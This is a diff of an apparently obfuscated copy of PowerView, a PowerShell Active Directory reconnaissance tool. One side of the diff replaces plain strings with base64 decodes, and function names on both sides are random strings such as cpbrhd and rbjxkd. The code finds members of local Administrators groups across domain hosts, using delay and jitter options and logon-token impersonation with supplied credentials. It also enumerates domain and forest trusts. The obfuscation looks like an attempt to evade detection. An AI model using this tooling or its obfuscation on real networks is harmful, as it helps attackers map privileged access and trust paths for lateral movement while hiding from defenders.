+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
+        if ($PSBoundParameters['ComputerName']) {
             $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gUXVlcnlpbmcgY29tcHV0ZXJzIGluIHRoZSBkb21haW4=")))
-            $TargetComputers = aglnim @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[Find-DomainLocalGroupMember] Querying computers in the domain'
+            $TargetComputers = auxvef @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gVGFyZ2V0Q29tcHV0ZXJzIGxlbmd0aDogezB9"))) -f $($TargetComputers.Length))
+        Write-Verbose ("[Find-DomainLocalGroupMember] TargetComputers length: {0}" -f $($TargetComputers.Length))
         if ($TargetComputers.Length -eq 0) {
-            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRl")))
+            throw '[Find-DomainLocalGroupMember] No hosts found to enumerate'
         }
 
         
@@ -11846,50 +11850,50 @@ function cpbrhd {
             Param($ComputerName, $GroupName, $Method, $TokenHandle)
 
             
-            if ($GroupName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM=")))) {
+            if ($GroupName -eq "Administrators") {
                 $AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
-                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))[-1]
+                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
             }
 
             if ($TokenHandle) {
                 
-                $Null = jgnbzn -TokenHandle $TokenHandle -Quiet
+                $Null = kckfvi -TokenHandle $TokenHandle -Quiet
             }
 
             ForEach ($TargetComputer in $ComputerName) {
                 $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
                     $NetLocalGroupMemberArguments = @{
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) = $TargetComputer
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWV0aG9k"))) = $Method
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) = $GroupName
+                        'ComputerName' = $TargetComputer
+                        'Method' = $Method
+                        'GroupName' = $GroupName
                     }
-                    gmmjsn @NetLocalGroupMemberArguments
+                    wtfsrl @NetLocalGroupMemberArguments
                 }
             }
 
             if ($TokenHandle) {
-                husafk
+                njmybn
             }
         }
 
         $LogonToken = $Null
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
-                $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
+                $LogonToken = kckfvi -Credential $Credential
             }
             else {
-                $LogonToken = jgnbzn -Credential $Credential -Quiet
+                $LogonToken = kckfvi -Credential $Credential -Quiet
             }
         }
     }
 
     PROCESS {
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
+        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiB7MH0="))) -f $($TargetComputers.count))
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVy")))
+            Write-Verbose ("[Find-DomainLocalGroupMember] Total number of hosts: {0}" -f $($TargetComputers.count))
+            Write-Verbose "[Find-DomainLocalGroupMember] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
@@ -11899,28 +11903,28 @@ function cpbrhd {
                 
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gRW51bWVyYXRpbmcgc2VydmVyICRUYXJnZXRDb21wdXRlciAoJENvdW50ZXIgb2YgezB9KQ=="))) -f $($TargetComputers.count))
+                Write-Verbose ("[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of {0})" -f $($TargetComputers.count))
                 Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
             }
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHM=")))
+            Write-Verbose "[Find-DomainLocalGroupMember] Using threading with threads: $Threads"
 
             
             $ScriptParams = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) = $GroupName
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWV0aG9k"))) = $Method
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU="))) = $LogonToken
+                'GroupName' = $GroupName
+                'Method' = $Method
+                'TokenHandle' = $LogonToken
             }
 
             
-            payhcg -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            umwnhz -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
@@ -11932,7 +11936,7 @@ function cpbrhd {
 
 
 
-function wajfkh {
+function rbjxkd {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -11982,7 +11986,7 @@ function wajfkh {
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateRange(1, 10000)]
@@ -12010,48 +12014,48 @@ function wajfkh {
 
     BEGIN {
         $TrustAttributes = @{
-            [uint32]'0x00000001' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9OX1RSQU5TSVRJVkU=")))
-            [uint32]'0x00000002' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVBMRVZFTF9PTkxZ")))
-            [uint32]'0x00000004' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RklMVEVSX1NJRFM=")))
-            [uint32]'0x00000008' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rk9SRVNUX1RSQU5TSVRJVkU=")))
-            [uint32]'0x00000010' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q1JPU1NfT1JHQU5JWkFUSU9O")))
-            [uint32]'0x00000020' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V0lUSElOX0ZPUkVTVA==")))
-            [uint32]'0x00000040' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFJFQVRfQVNfRVhURVJOQUw=")))
-            [uint32]'0x00000080' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFJVU1RfVVNFU19SQzRfRU5DUllQVElPTg==")))
-            [uint32]'0x00000100' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFJVU1RfVVNFU19BRVNfS0VZUw==")))
-            [uint32]'0x00000200' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q1JPU1NfT1JHQU5JWkFUSU9OX05PX1RHVF9ERUxFR0FUSU9O")))
-            [uint32]'0x00000400' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UElNX1RSVVNU")))
+            [uint32]'0x00000001' = 'NON_TRANSITIVE'
+            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
+            [uint32]'0x00000004' = 'FILTER_SIDS'
+            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
+            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
+            [uint32]'0x00000020' = 'WITHIN_FOREST'
+            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
+            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
+            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
+            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
+            [uint32]'0x00000400' = 'PIM_TRUST'
         }
 
         $LdapSearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $LdapSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $LdapSearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['Properties']) { $LdapSearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $LdapSearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $LdapSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $LdapSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $LdapSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $LdapSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $LdapSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $LdapSearcherArguments['Credential'] = $Credential }
     }
 
     PROCESS {
-        if ($PsCmdlet.ParameterSetName -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ")))) {
+        if ($PsCmdlet.ParameterSetName -ne 'API') {
             $NetSearcherArguments = @{}
             if ($Domain -and $Domain.Trim() -ne '') {
                 $SourceDomain = $Domain
             }
             else {
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-                    $SourceDomain = (wjdyuo -Credential $Credential).Name
+                if ($PSBoundParameters['Credential']) {
+                    $SourceDomain = (owdzhi -Credential $Credential).Name
                 }
                 else {
-                    $SourceDomain = (wjdyuo).Name
+                    $SourceDomain = (owdzhi).Name
                 }
             }
         }
-        elseif ($PsCmdlet.ParameterSetName -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TkVU")))) {
+        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
             if ($Domain -and $Domain.Trim() -ne '') {
                 $SourceDomain = $Domain
             }
@@ -12060,16 +12064,16 @@ function wajfkh {
             }
         }
 
-        if ($PsCmdlet.ParameterSetName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA==")))) {
+        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
             
-            $TrustSearcher = ltdynu @LdapSearcherArguments
-            $SourceSID = elvzov @NetSearcherArguments
+            $TrustSearcher = vydvzz @LdapSearcherArguments
+            $SourceSID = fkynsl @NetSearcherArguments
 
             if ($TrustSearcher) {
 
-                $TrustSearcher.Filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENsYXNzPXRydXN0ZWREb21haW4p")))
+                $TrustSearcher.Filter = '(objectClass=trustedDomain)'
 
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $TrustSearcher.FindOne() }
+                if ($PSBoundParameters['FindOne']) { $Results = $TrustSearcher.FindOne() }
                 else { $Results = $TrustSearcher.FindAll() }
                 $Results | Where-Object {$_} | ForEach-Object {
                     $Props = $_.Properties
@@ -12079,28 +12083,28 @@ function wajfkh {
                     $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }
 
                     $Direction = Switch ($Props.trustdirection) {
-                        0 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzYWJsZWQ="))) }
-                        1 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5ib3VuZA=="))) }
-                        2 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0Ym91bmQ="))) }
-                        3 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QmlkaXJlY3Rpb25hbA=="))) }
+                        0 { 'Disabled' }
+                        1 { 'Inbound' }
+                        2 { 'Outbound' }
+                        3 { 'Bidirectional' }
                     }
 
                     $TrustType = Switch ($Props.trusttype) {
-                        1 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V0lORE9XU19OT05fQUNUSVZFX0RJUkVDVE9SWQ=="))) }
-                        2 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V0lORE9XU19BQ1RJVkVfRElSRUNUT1JZ"))) }
-                        3 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TUlU"))) }
+                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
+                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
+                        3 { 'MIT' }
                     }
 
                     $Distinguishedname = $Props.distinguishedname[0]
-                    $SourceNameIndex = $Distinguishedname.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))
+                    $SourceNameIndex = $Distinguishedname.IndexOf('DC=')
                     if ($SourceNameIndex) {
-                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
+                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace 'DC=','' -replace ',','.'
                     }
                     else {
                         $SourceDomain = ""
                     }
 
-                    $TargetNameIndex = $Distinguishedname.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LENOPVN5c3RlbQ=="))))
+                    $TargetNameIndex = $Distinguishedname.IndexOf(',CN=System')
                     if ($SourceNameIndex) {
                         $TargetDomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)
                     }
@@ -12111,29 +12115,29 @@ function wajfkh {
                     $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                     $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
 
-                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U291cmNlTmFtZQ=="))) $SourceDomain
-                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TmFtZQ=="))) $Props.name[0]
+                    $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
+                    $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
                     
-                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RUeXBl"))) $TrustType
-                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RBdHRyaWJ1dGVz"))) $($TrustAttrib -join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))
-                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3REaXJlY3Rpb24="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JERpcmVjdGlvbg==")))
-                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2hlbkNyZWF0ZWQ="))) $Props.whencreated[0]
-                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2hlbkNoYW5nZWQ="))) $Props.whenchanged[0]
-                    $DomainTrust.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkRvbWFpblRydXN0LkxEQVA="))))
+                    $DomainTrust | Add-Member Noteproperty 'TrustType' $TrustType
+                    $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $($TrustAttrib -join ',')
+                    $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
+                    $DomainTrust | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
+                    $DomainTrust | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
+                    $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                     $DomainTrust
                 }
                 if ($Results) {
                     try { $Results.dispose() }
                     catch {
-                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5UcnVzdF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogezB9"))) -f $_)
+                        Write-Verbose ("[Get-DomainTrust] Error disposing of the Results object: {0}" -f $_)
                     }
                 }
                 $TrustSearcher.dispose()
             }
         }
-        elseif ($PsCmdlet.ParameterSetName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ")))) {
+        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
             
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) {
+            if ($PSBoundParameters['Server']) {
                 $TargetDC = $Server
             }
             elseif ($Domain -and $Domain.Trim() -ne '') {
@@ -12176,20 +12180,20 @@ function wajfkh {
                     $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
                     if ($Result -eq 0) {
-                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5UcnVzdF0gRXJyb3I6IHswfQ=="))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
+                        Write-Verbose ("[Get-DomainTrust] Error: {0}" -f $(([ComponentModel.Win32Exception] $LastError).Message))
                     }
                     else {
                         $DomainTrust = New-Object PSObject
-                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U291cmNlTmFtZQ=="))) $SourceDomain
-                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TmFtZQ=="))) $Info.DnsDomainName
-                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TmV0Ymlvc05hbWU="))) $Info.NetbiosDomainName
-                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmxhZ3M="))) $Info.Flags
-                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGFyZW50SW5kZXg="))) $Info.ParentIndex
-                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RUeXBl"))) $Info.TrustType
-                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RBdHRyaWJ1dGVz"))) $Info.TrustAttributes
-                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2lk"))) $SidString
-                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0R3VpZA=="))) $Info.DomainGuid
-                        $DomainTrust.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkRvbWFpblRydXN0LkFQSQ=="))))
+                        $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
+                        $DomainTrust | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
+                        $DomainTrust | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
+                        $DomainTrust | Add-Member Noteproperty 'Flags' $Info.Flags
+                        $DomainTrust | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
+                        $DomainTrust | Add-Member Noteproperty 'TrustType' $Info.TrustType
+                        $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
+                        $DomainTrust | Add-Member Noteproperty 'TargetSid' $SidString
+                        $DomainTrust | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
+                        $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                         $DomainTrust
                     }
                 }
@@ -12197,15 +12201,15 @@ function wajfkh {
                 $Null = $Netapi32::NetApiBufferFree($PtrInfo)
             }
             else {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5UcnVzdF0gRXJyb3I6IHswfQ=="))) -f $(([ComponentModel.Win32Exception] $Result).Message))
+                Write-Verbose ("[Get-DomainTrust] Error: {0}" -f $(([ComponentModel.Win32Exception] $Result).Message))
             }
         }
         else {
             
-            $FoundDomain = wjdyuo @NetSearcherArguments
+            $FoundDomain = owdzhi @NetSearcherArguments
             if ($FoundDomain) {
                 $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
-                    $_.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkRvbWFpblRydXN0Lk5FVA=="))))
+                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                     $_
                 }
             }
@@ -12214,7 +12218,7 @@ function wajfkh {
 }
 
 
-function cnfeft {
+function piaqbp {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -12234,14 +12238,14 @@ function cnfeft {
 
     PROCESS {
         $NetForestArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) { $NetForestArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))] = $Forest }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $NetForestArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Forest']) { $NetForestArguments['Forest'] = $Forest }
+        if ($PSBoundParameters['Credential']) { $NetForestArguments['Credential'] = $Credential }
 
-        $FoundForest = ongcjs @NetForestArguments
+        $FoundForest = cgxtvt @NetForestArguments
 
         if ($FoundForest) {
             $FoundForest.GetAllTrustRelationships() | ForEach-Object {
-                $_.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkZvcmVzdFRydXN0Lk5FVA=="))))
+                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                 $_
             }
         }
@@ -12249,7 +12253,7 @@ function cnfeft {
 }
 
 
-function ikhlpc {
+function gddyxp {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -12283,7 +12287,7 @@ function ikhlpc {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -12307,42 +12311,42 @@ function ikhlpc {
 
     BEGIN {
         $SearcherArguments = @{}
-        $SearcherArguments['LDAPFilter'] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG1lbWJlcm9mPSop")))
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
